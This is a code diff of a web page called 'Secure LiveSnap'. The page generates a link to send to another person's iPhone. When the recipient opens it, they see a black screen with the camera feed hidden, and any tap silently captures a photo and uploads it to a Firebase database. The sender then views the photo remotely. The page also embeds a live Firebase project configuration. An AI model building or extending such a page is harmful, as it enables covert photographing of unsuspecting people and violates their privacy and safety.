@@ -2,59 +2,99 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>Live Control</title>
+  <title>Secure LiveSnap</title>
   <style>
     body {
+      margin: 0;
       background: black;
       color: white;
-      text-align: center;
       font-family: sans-serif;
-      padding-top: 50px;
+      text-align: center;
     }
-    input {
+    #control, #capture {
+      display: none;
+    }
+    input, button {
       padding: 10px;
       font-size: 18px;
-      width: 250px;
-    }
-    button {
-      padding: 10px;
-      font-size: 16px;
-      margin-left: 10px;
+      margin-top: 10px;
     }
     img {
       margin-top: 20px;
       max-width: 90%;
       border: 2px solid white;
     }
+    video {
+      display: none;
+    }
   </style>
 </head>
 <body>
+
+<!-- Control Panel (Android) -->
+<div id="control">
   <h2>Enter Your Private Key</h2>
   <input type="text" id="keyInput" placeholder="e.g. mypass123">
   <button onclick="generateLink()">Generate Link</button>
   <p id="linkDisplay"></p>
   <img id="photo" src="" alt="Waiting for photo..." />
+</div>
 
-  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
-  <script>
-    const firebaseConfig = {
-      apiKey: "AIzaSyByYx-ScUywHwz_YK_ZV7rDREBTScrWWKs",
-      authDomain: "livesnap-d57c2.firebaseapp.com",
-      databaseURL: "https://livesnap-d57c2-default-rtdb.asia-southeast1.firebasedatabase.app",
-      projectId: "livesnap-d57c2",
-      storageBucket: "livesnap-d57c2.firebasestorage.app",
-      messagingSenderId: "24202813286",
-      appId: "1:24202813286:web:02304adf2c5ffed9fab2a7",
-      measurementId: "G-BR9MFH2XN6"
-    };
-    firebase.initializeApp(firebaseConfig);
-    const db = firebase.database();
+<!-- Capture Page (iPhone) -->
+<div id="capture" onclick="capture()" ontouchstart="capture()">
+  <video id="video" autoplay playsinline></video>
+  <canvas id="canvas" style="display:none;"></canvas>
+</div>
+
+<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
+<script>
+  const firebaseConfig = {
+    apiKey: "AIzaSyByYx-ScUywHwz_YK_ZV7rDREBTScrWWKs",
+    authDomain: "livesnap-d57c2.firebaseapp.com",
+    databaseURL: "https://livesnap-d57c2-default-rtdb.asia-southeast1.firebasedatabase.app",
+    projectId: "livesnap-d57c2",
+    storageBucket: "livesnap-d57c2.firebasestorage.app",
+    messagingSenderId: "24202813286",
+    appId: "1:24202813286:web:02304adf2c5ffed9fab2a7",
+    measurementId: "G-BR9MFH2XN6"
+  };
+  firebase.initializeApp(firebaseConfig);
+  const db = firebase.database();
+
+  const params = new URLSearchParams(window.location.search);
+  const captureKey = params.get("capture");
+
+  if (captureKey) {
+    // Show capture page
+    document.getElementById("capture").style.display = "block";
+    const video = document.getElementById("video");
+    const canvas = document.getElementById("canvas");
+
+    navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
+      video.srcObject = stream;
+    });
+
+    function capture() {
+      const ctx = canvas.getContext('2d');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      const dataUrl = canvas.toDataURL("image/jpeg");
+
+      db.ref("livephoto/" + captureKey).set({
+        image: dataUrl,
+        time: Date.now()
+      });
+    }
+  } else {
+    // Show control panel
+    document.getElementById("control").style.display = "block";
 
     function generateLink() {
       const key = document.getElementById("keyInput").value.trim();
-      if (!key) return alert("Please enter a valid key");
-      const link = window.location.origin + "/capture.html?key=" + encodeURIComponent(key);
+      if (!key) return alert("Enter a valid key");
+      const link = window.location.origin + window.location.pathname + "?capture=" + encodeURIComponent(key);
       document.getElementById("linkDisplay").innerHTML = `<b>Send this link to iPhone:</b><br><a style='color:lime' href="${link}" target="_blank">${link}</a>`;
 
       db.ref("livephoto/" + key).on("value", snapshot => {
@@ -64,6 +104,9 @@
         }
       });
     }
-  </script>
+
+    window.generateLink = generateLink;
+  }
+</script>
 </body>
 </html>
